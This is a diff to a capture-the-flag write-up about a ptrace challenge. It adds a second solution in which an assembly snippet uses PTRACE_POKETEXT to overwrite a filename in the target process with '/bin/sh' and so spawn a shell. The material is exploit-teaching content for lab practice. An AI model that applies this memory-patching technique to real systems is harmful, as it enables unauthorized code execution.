@@ -23,7 +23,7 @@ You can proof-of-concept this in GDB then use that to craft a `ptrace` payload.
 
 This challenge is a great way to learn about `ptrace`.  If new to `ptrace` consider reading [https://www.linuxjournal.com/article/6210](https://www.linuxjournal.com/article/6210)--it's 20 years old, but it's still spot on and very useful.
 
-> There are multiple ways to solve this.  Below is just _one_ way.
+> There are multiple ways to solve this.  Below is just _one_ way.  Below that is a second way.
 
 ## Analysis
 
@@ -567,6 +567,8 @@ Retrying until even PID.
 
 ### Shell Version
 
+Patch is changed to get a shell using `execve`:
+
 ```python
 patch = asm(
 f'''
@@ -578,9 +580,17 @@ syscall
 ''')
 ```
 
-Payload is just changed to get a shell using `execve`.
+Instead of `flag` replacing `readstory.txt`, it's `/bin/sh`:
 
-Instead of `flag` replacing `readstory.txt`, it's `/bin/sh`.
+```
+/* /bin/sh as readstory.txt */
+mov rdi, {PTRACE_POKETEXT}
+mov rsi, {pid}
+mov rdx, {binary.search(b'readstory.txt').__next__()}
+mov r10, {'0x' + hexlify(b'/bin/sh'[::-1]).decode()}
+mov rax, {constants.SYS_ptrace}
+syscall
+```
 
 See [`exploit2.py`](exploit2.py) for details.
 
